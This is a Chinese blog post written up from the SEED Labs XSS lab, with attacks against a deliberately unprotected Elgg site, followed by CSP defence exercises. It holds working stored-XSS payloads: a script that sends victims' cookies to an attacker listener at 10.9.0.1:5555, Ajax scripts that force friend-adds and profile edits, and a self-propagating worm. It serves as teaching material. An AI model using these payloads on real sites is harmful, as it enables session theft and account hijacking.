---
title: Web安全-XSS攻击
date: 2026-03-16
categories: Web安全
toc: true
---

跨站脚本攻击 XSS 能向受害者的网页浏览器中注入恶意 JS 代码，窃取 Cookie 等敏感信息。

本实验使用关闭 XSS 防护的开源社交网络应用 Elgg ，进行 XSS 攻击与防护实验。

<!--more-->

- Cross-Site Scripting attack
- XSS worm and self-propagation
- Session cookies
- HTTP GET and POST requests
- JavaScript and Ajax
- Content Security Policy (CSP)

## 环境搭建

下载 `Labsetup-XSS` 

```bash
$ dcbuild
$ dcup
# 关闭实验环境
$ dcdown
```

执行前两条命令后环境就已经搭建完了，访问 `www.seed-server.com` 就可以开始实验

```
----------------------------
UserName | Password
----------------------------
admin    | seedelgg
alice    | seedalice
boby     | seedboby
charlie  | seedcharlie
samy     | seedsamy
----------------------------
```



下面解析一下具体环境配置

`docker-compose.yml` 内容：

```yml
version: "3"

services:
    elgg:
        build: ./image_www    # 从本地目录构建镜像
        image: seed-image-www # 指定镜像名称
        container_name: elgg-10.9.0.5
        tty: true   # 分配伪终端，方便调试
        networks:
            net-10.9.0.0:
                ipv4_address: 10.9.0.5

    mysql:
        build: ./image_mysql
        image: seed-image-mysql
        container_name: mysql-10.9.0.6
        command: --default-authentication-plugin=mysql_native_password
        tty: true
        restart: always
        cap_add:
                - SYS_NICE  # CAP_SYS_NICE (supress an error message)
        volumes:
                - ./mysql_data:/var/lib/mysql
        networks:
            net-10.9.0.0:
                ipv4_address: 10.9.0.6

networks:
    net-10.9.0.0:
        name: net-10.9.0.0
        ipam:
            config:
                - subnet: 10.9.0.0/24
```

创建 `net-10.9.0.0` 桥接网络，子网为 `10.9.0.0/24`

从本地目录构建两个镜像：`Elgg` `MySQL` 

两个容器被分配静态 IP：

- `Elgg`：`10.9.0.5`
- `MySQL`：`10.9.0.6`



添加 DNS 解析：

```bash
sudo nano /etc/hosts
```

```
# For XSS Lab
10.9.0.5        www.seed-server.com
10.9.0.5        www.example32a.com
10.9.0.5        www.example32b.com
10.9.0.5        www.example32c.com
10.9.0.5        www.example60.com
10.9.0.5        www.example70.com
```



## 实验内容

### XSS 攻击

#### Task 1 - 主页 XSS

Alice 上传个人信息，所有访问 Alice 主页、看到个人信息的用户，显示一个 alert 窗口

编辑、保存个人信息，在 Brief description中：

```js
<script>alert("XSS");</script>
```

任何用户打开 Alice 主页时就会弹出 XSS 窗口

![image-20260413114528893](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/1.png)



#### Task 2 - XSS 窃取 Cookie

窃取 cookie，只需把刚才的 JS 代码修改为：

```js
<script>alert(document.cookie);</script>
```

用户点击 Alice 主页时会弹出 Cookie 的内容

![image-20260413114608898](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/2.png)



#### Task 3 - XSS 发送 Cookie

发送刚刚弹出的 Cookie 到攻击者主机上

攻击者的 address: `http://10.9.0.1:5555`

按实验文档，使用 JS 加载外部图片资源的方式，发送 Cookie 到攻击者主机上

```js
<script>document.write('<img src=http://10.9.0.1:5555?c=' 	+ escape(document.cookie) + ' 	>'); </script>
```

> `escape()` 函数硬编码字符串以便在 URL 中安全传输 

在攻击者主机上监听这个端口

```bash
nc -lknv 10.9.0.1 5555
```

就能接收这个 Cookie

![image-20260413115541106](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/3.png)





#### Task 4 - XSS 添加好友

将任何打开 Samy 主页的人添加为 Samy 的好友

实际上只需要在 Samy 主页插入添加 Samy 好友的 JS 脚本即可

Elgg 平台只要添加好友就直接成为好友，不需要验证

先抓包正常添加 Samy 好友的请求：add friend

```http
GET http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1776054218&__elgg_token=ia-MzoXioL091E1ZYys9gQ&__elgg_ts=1776054218&__elgg_token=ia-MzoXioL091E1ZYys9gQ

Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
Cookie: Elgg=og7nrivavoifr3uncbevafr0sl; elggperm=zSqNRuMo7xKJ7dTdawc2cm2B_9aDKxtp
```

注意到参数 friend=59 ，是 Samy 的 Guid

将 下面这段脚本添加到 About me 介绍

```js
<script type="text/javascript">
window.onload = function () {
	var Ajax = null;
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var samyGuid = 59;
    
    var sendurl = "/action/friends/add?friend=" + samyGuid + ts + token;
    
	Ajax=new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.send();
}
</script>
```

再访问 Alice 主页，自动添加 Samy 好友

![image-20260413124109784](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/4.png)



#### Task 5 - XSS 修改用户资料

修改受害者的个人资料，即任何打开 Samy 主页的人，自动被修改主页，暂时不要求传播（Task 6 内容）

先抓修改主页的包

```http
POST /action/profile/edit HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------32399045701222284708925230685
Content-Length: 2968
Origin: http://www.seed-server.com
DNT: 1
Connection: keep-alive
Referer: http://www.seed-server.com/profile/alice/edit
Cookie: Elgg=sghivmgf99i06se0sm4valpsg4
Upgrade-Insecure-Requests: 1


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="__elgg_token"

vxUZ0IyRUvzI9_m0sumI_g
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="__elgg_ts"

1776324429
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="name"

Alice
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="description"

test
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[description]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="briefdescription"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[briefdescription]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="location"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[location]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="interests"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[interests]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="skills"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[skills]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="contactemail"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[contactemail]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="phone"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[phone]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="mobile"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[mobile]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="website"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[website]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="twitter"


-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="accesslevel[twitter]"

2
-----------------------------32399045701222284708925230685
Content-Disposition: form-data; name="guid"

56
-----------------------------32399045701222284708925230685--
```



```js
<script type="text/javascript">
window.onload = function(){
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var wormCode = 'test';

    var content = "__elgg_token=" + elgg.security.token.__elgg_token +
                  "&__elgg_ts=" + elgg.security.token.__elgg_ts +
                  "&name=" + elgg.session.user.name +
                  "&description=" + encodeURIComponent(wormCode) +
                  "&accesslevel[description]=2" +
                  "&briefdescription=" +
                  "&accesslevel[briefdescription]=2" +
                  "&location=" +
                  "&accesslevel[location]=2" +
                  "&interests=" + 
            	  "&guid=" + elgg.session.user.guid;

	var samyGuid = 59;

	var sendurl = "/action/profile/edit";

	if(elgg.session.user.guid != samyGuid){
		var Ajax = new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>
```

> 这里 `Elgg` 支持 `multipart/form-data; boundary=......` 和  `application/x-www-form-urlencoded`
>
> `application/x-www-form-urlencoded`是一种常见的表单数据提交方式，它将表单数据编码为键值对的形式，然后将其放置在 HTTP 请求的消息体中进行传输。这种编码方式通过将特殊字符转换成 `%xx` 格式来处理数据，以确保数据的正确传输。典型的使用场景包括登录表单、搜索表单等简单的表单提交，以及对传输数据量要求较小的场景。
>
> `multipart/form-data`适用于需要上传文件或二进制数据的场景。与`application/x-www-form-urlencoded`不同，它将表单数据编码成一系列分部分（parts），每个部分都有一个唯一的标识符，并且每个部分可以是不同的数据类型，包括文本和二进制数据。典型的使用场景包括文件上传表单、富文本编辑器等需要传输大量二进制数据的场景。



Alice 访问 Samy 主页时，发出了一个 edit 的 POST 请求

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/5.png)

再查看 Alice 主页，About me 字段被更新了，成功修改 profile

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/6.png)



#### Task 6 - 自我传播的 XSS 蠕虫

现在要求具有自传播能力，利用 `document.getElementById("worm").innerHTML;` 获得自己的 JS 代码

```js
<script id="worm">
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML;
var tailTag = "</" + "script>";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

window.onload = function(){
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var content = "__elgg_token=" + elgg.security.token.__elgg_token +
                  "&__elgg_ts=" + elgg.security.token.__elgg_ts +
                  "&name=" + elgg.session.user.name +
                  "&description=" + wormCode +
                  "&accesslevel[description]=2" +
                  "&briefdescription=" +
                  "&accesslevel[briefdescription]=2" +
                  "&location=" +
                  "&accesslevel[location]=2" +
                  "&interests=" + 
        		  "&guid=" + elgg.session.user.guid;

	var samyGuid = 59;

	var sendurl = "/action/profile/edit";

	if(elgg.session.user.guid != samyGuid){
		var Ajax = new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
alert("XSS"); 

</script>
```

用户 Alice 访问 Samy，出现弹窗

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/7.png)

此时 Alice 访问自己主页，也有弹窗，说明已经修改个人资料

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/8.png)



查看 About me 内容：正是 wormCode

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/9.png)

再登录 Boby 的个人账户，访问 Alice，同样出现弹窗，证明 XSS 蠕虫代码具备自传播特性

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/10.png)





### XSS 防护

#### Elgg 防护策略

Elgg 实际上内置了防护机制，之前攻击实验将其禁用以便攻击能够生效。

Elgg采用以下两种防护措施：

- **自定义安全插件HTMLawed**：该插件用于验证用户输入并移除输入中的标签。

	在`vendor/elgg/elgg/engine/lib/`目录下的`input.php`文件中的`filter_tags()`函数内注释掉了该插件的调用。具体代码如下：

	```php
	function filter_tags($var) {
	    // return elgg_trigger_plugin_hook(’validate’, ’input’, null, $var);
	    return $var;
	}
	```

- **PHP内置方法`htmlspecialchars()`**：该方法用于对用户输入中的特殊字符进行编码，例如将`<`编码为`<`，将`>`编码为`>`等。

	此方法在`vendor/elgg/elgg/views/default/output/`目录下的`dropdown.php`、`text.php`和`url.php`文件中被调用。我们已通过注释将其禁用。





#### CSP 

HTML 页面包含 JS 代码的两种方式：内联、链接

内容安全策略 CSP（content security policy）：告诉浏览器哪些代码源是可信的



`apache_csp.conf` 文件，

```conf
# Purpose: Do not set CSP policies
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32a.com
    DirectoryIndex index.html
</VirtualHost>

# Purpose: Setting CSP policies in Apache configuration
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32b.com
    DirectoryIndex index.html
    Header set Content-Security-Policy " \
             default-src 'self'; \
             script-src 'self' *.example70.com \
           "
</VirtualHost>
 
# Purpose: Setting CSP policies in web applications
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32c.com
    DirectoryIndex phpindex.php
</VirtualHost>

# Purpose: hosting Javascript files
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example60.com
</VirtualHost>

# Purpose: hosting Javascript files
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example70.com
</VirtualHost>
```

Web a、b、c 的 HTML： 

```html
<html>
<h2 >CSP Experiment</h2>
<p>1. Inline: Nonce (111-111-111): <span id='area1'><font color='red'>Failed</font></span></p>
<p>2. Inline: Nonce (222-222-222): <span id='area2'><font color='red'>Failed</font></span></p>
<p>3. Inline: No Nonce: <span id='area3'><font color='red'>Failed</font></span></p>
<p>4. From self: <span id='area4'><font color='red'>Failed</font></span></p>
<p>5. From www.example60.com: <span id='area5'><font color='red'>Failed</font></span></p>
<p>6. From www.example70.com: <span id='area6'><font color='red'>Failed</font></span></p>
<p>7. From button click: <button onclick="alert('JS Code executed!')">Click me</button></p>

<script type="text/javascript" nonce="111-111-111">
document.getElementById('area1').innerHTML = "<font color='green'>OK</font>";
</script>

<script type="text/javascript" nonce="222-222-222">
document.getElementById('area2').innerHTML = "<font color='green'>OK</font>";
</script>

<script type="text/javascript">
document.getElementById('area3').innerHTML = "<font color='green'>OK</font>";
</script>

<script src="script_area4.js"> </script>
<script src="http://www.example60.com/script_area5.js"> </script>
<script src="http://www.example70.com/script_area6.js"> </script>

</html>
```

> nonce 是 HTML 的一个全局属性，用于定义一个**密码学随机数**（即“只使用一次的数字”）。
>
> 它主要与 **内容安全策略（CSP, Content Security Policy）** 配合使用，用于防止常见的网络攻击，例如 **跨站脚本攻击（XSS）** 和数据注入攻击。

1、2 、3 内联 JS 代码，1、2有 nonce，3 no nonce

4 链接自己服务器

5、6分别链接 example60.com、example70.com

7 是 `<button onclick="alert('JS Code executed!')">`，也属于内联 JS 代码



#### Task 1

##### a

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/11.png)

```conf
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32a.com
    DirectoryIndex index.html
</VirtualHost>
```

没有设置 CSP 策略，任意源的 JS 代码都能执行，所有实验的 Failed 都被修改为 OK



##### b

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/12.png)

```conf
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32b.com
    DirectoryIndex index.html
    Header set Content-Security-Policy " \
             default-src 'self'; \
             script-src 'self' *.example70.com \
           "
</VirtualHost>
```

设置 CSP ：

- 对于脚本，只允许执行来自 `self`  和 `*.example70.com` 的

- 对于其他内容（图片、字体等）：默认策略，只允许 `self`



##### c

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/13.png)

```conf
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32c.com
    DirectoryIndex phpindex.php
</VirtualHost>
```

`phpindex.php` :

```php
<?php
  $cspheader = "Content-Security-Policy:".
               "default-src 'self';".
               "script-src 'self' 'nonce-111-111-111' *.example70.com".
               "";
  header($cspheader);
?>

<?php include 'index.html';?>
```

对于脚本，只允许执行来自 `self`  、`nonce-111-111-111` 、 `*.example70.com` 的代码





#### Task 2

onclick 里的代码属于内联代码

##### a

弹出窗口

##### b

无反应

##### c

无反应





#### Task 3

> Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and
> 6 display OK. Please include your modified configuration in the lab report.

```conf
# Purpose: Setting CSP policies in Apache configuration
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32b.com
    DirectoryIndex index.html
    Header set Content-Security-Policy " \
             default-src 'self'; \
             script-src 'self' *.example70.com *.example60.com \
           "
</VirtualHost>
```

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/14.png)



#### Task 4

> Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6
> all display OK. Please include your modified configuration in the lab report.

```php
<?php
  $cspheader = "Content-Security-Policy:".
               "default-src 'self';".
               "script-src 'self' 'nonce-111-111-111' 'nonce-222-222-222' *.example70.com *.example60.com".
               "";
  header($cspheader);
?>

<?php include 'index.html';?>

```

![image-20260416161638535](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-XSS/15.png)



#### Task 5

> Please explain why CSP can help prevent Cross-Site Scripting attacks. 

```http
GET  http://www.example32b.com/
```

在服务器响应中：

```http
HTTP/1.1 200 OK
Date: Thu, 16 Apr 2026 11:15:27 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Mon, 13 Apr 2026 02:31:29 GMT
ETag: "4da-64f4e47afa240-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Security-Policy: default-src 'self';              script-src 'self' *.example70.com *.example60.com
Content-Length: 397
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
```

`Content-Security-Policy` 告诉浏览器哪些地方的 JS 代码是可信的



## 总结

跨站脚本攻击（**Cross Site Scripting**，简称 XSS）

- 反射型：攻击者将恶意脚本注入到 URL 中，诱导用户点击特定链接，服务器反射请求回客户端，从而触发脚本执行。
- 存储型：攻击者将恶意脚本提交到服务器端，并在其他用户访问相关内容时被加载和执行。
- DOM 型：基于浏览器中的文档对象模型（DOM）进行攻击的一种方式，攻击入口仍通过 URL 参数传递；恶意代码不出现在 HTML 源码中，而是在浏览器解析 DOM 时动态执行； 主要依赖客户端 JavaScript 中的不安全操作（如 `document.write()`、`innerHTML`、`eval()` 等）； 



本次实验本质上是 存储型 XSS



防御措施：CSP ；输入转义(Escaping)：所有前端内容进行 HTML 转义，最根本防御手段

- 反射型：避免直接拼接 HTML
- 存储型：服务端输入验证与过滤
- DOM 型：避免不安全的 DOM 操作innerHTML、outerHTML、document.write()



1. DOM-based XSS 不经过服务器，传统的服务端过滤和 WAF 无法防御
2. HttpOnly Cookie 可以在 HTTP 响应头设置，阻止 document.cookie 读取，但无法阻止 XSS